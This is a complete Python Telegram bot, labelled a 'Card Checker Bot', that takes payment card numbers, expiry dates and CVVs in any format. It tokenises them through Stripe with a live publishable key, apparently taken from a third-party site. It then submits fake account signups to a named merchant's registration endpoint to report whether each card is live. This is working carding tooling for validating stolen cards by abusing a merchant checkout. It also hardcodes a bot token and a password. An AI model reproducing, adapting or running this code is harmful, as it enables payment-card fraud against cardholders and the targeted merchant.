import telebot
import requests
import re
import random
import string
import time

BOT_TOKEN = "8072279299:AAHSQpNR0d4PuzY5l9kHAqT61-IjWhNjIAI"
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_gTSPTLXTGXVgIrOkNxFA8F9200HdVDgFMa"
STRIPE_URL = "https://api.stripe.com/v1/tokens"
FINAL_URL = "https://app.strongproposals.com/registration/submit"

def generate_random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

def extract_cards(text):
    # Find all card-like blocks in the text
    card_blocks = re.split(r"\n+", text)
    cards = []
    for block in card_blocks:
        card = parse_card_any_format(block)
        if card:
            cards.append(card)
    return cards

def parse_card_any_format(text):
    # Card number: 13-19 digits
    card_match = re.search(r"\b(?:\d[ -]*?){13,19}\b", text)
    if not card_match:
        return None
    card_number = re.sub(r"\D", "", card_match.group())

    # Expiry: MM/YY, MM/YYYY, or similar
    exp_match = re.search(r"(0[1-9]|1[0-2])[\s\/\-\.]?([0-9]{2,4})", text)
    if not exp_match:
        return None
    mm = exp_match.group(1)
    yy = exp_match.group(2)[-2:]

    # CVV: 3 or 4 digits, after "cvv", "cvc", or as last 3-4 digits in text
    cvv_match = re.search(r"(cvv|cvc)[\s:]*([0-9]{3,4})", text, re.IGNORECASE)
    if not cvv_match:
        # Try to get last 3-4 digit number in text
        cvv_match = re.findall(r"\b\d{3,4}\b", text)
        if cvv_match:
            cvv = cvv_match[-1]
        else:
            return None
    else:
        cvv = cvv_match.group(2)
    return card_number, mm, yy, cvv

def create_stripe_token(cc, mm, yy, cvc):
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    data = {
        "card[number]": cc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[cvc]": cvc,
        "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "payment_user_agent": "stripe.js/78ef418",
        "time_on_page": str(random.randint(10000, 99999)),
        "key": STRIPE_PUBLISHABLE_KEY
    }
    resp = requests.post(STRIPE_URL, data=data, headers=headers)
    try:
        resp_json = resp.json()
    except Exception as e:
        return None, f"Stripe JSON decode error: {str(e)}"
    token = resp_json.get('id')
    if not token or not token.startswith("tok_"):
        return None, f"Stripe error: {resp_json.get('error', {}).get('message', 'Unknown error')}"
    return token, None

def submit_final_request(token, email, cc, mm, yy, cvc):
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://app.strongproposals.com",
        "referer": "https://app.strongproposals.com/signup/panel",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    data = {
        "_token": token,  # Using Stripe token as _tok value
        "first_name": "Peshang",
        "last_name": "Salam",
        "email_confirmation": email,
        "email": email,
        "password_confirmation": "War112233$%",
        "password": "War112233$%",
        "phone": "3144740104",
        "card_number": cc,
        "card-cvc": cvc,
        "month": mm,
        "year": yy,
        "stripe_token": token,
        "package_id": '11"',
    }
    response = requests.post(FINAL_URL, data=data, headers=headers)
    return response.text

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 StrongProposals Card Checker Bot\n"
        "Send card details in ANY format (even messy):\n"
        "Examples:\n"
        "5218531024116809\nCVV: 983\nEXP: 07/2029\n"
        "or\n4242 4242 4242 4242 exp 12/25 cvc 123"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = extract_cards(message.text)
    if not cards:
        bot.reply_to(message, "❌ Couldn't extract valid card details")
        return
    for cc, mm, yy, cvc in cards:
        email = generate_random_email()
        token, err = create_stripe_token(cc, mm, yy, cvc)
        if err:
            bot.send_message(message.chat.id, f"❌ Stripe token error: {err}")
            continue
        final_response = submit_final_request(token, email, cc, mm, yy, cvc)
        status = "❌ DECLINED" if "declined" in final_response.lower() else "✅ LIVE"
        bot.send_message(
            message.chat.id,
            f"Card: {cc}|{mm}|{yy}|{cvc}\nEmail: {email}\nStatus: {status}\n\nFull Response:\n{final_response}"
        )
        time.sleep(10)

bot.infinity_polling()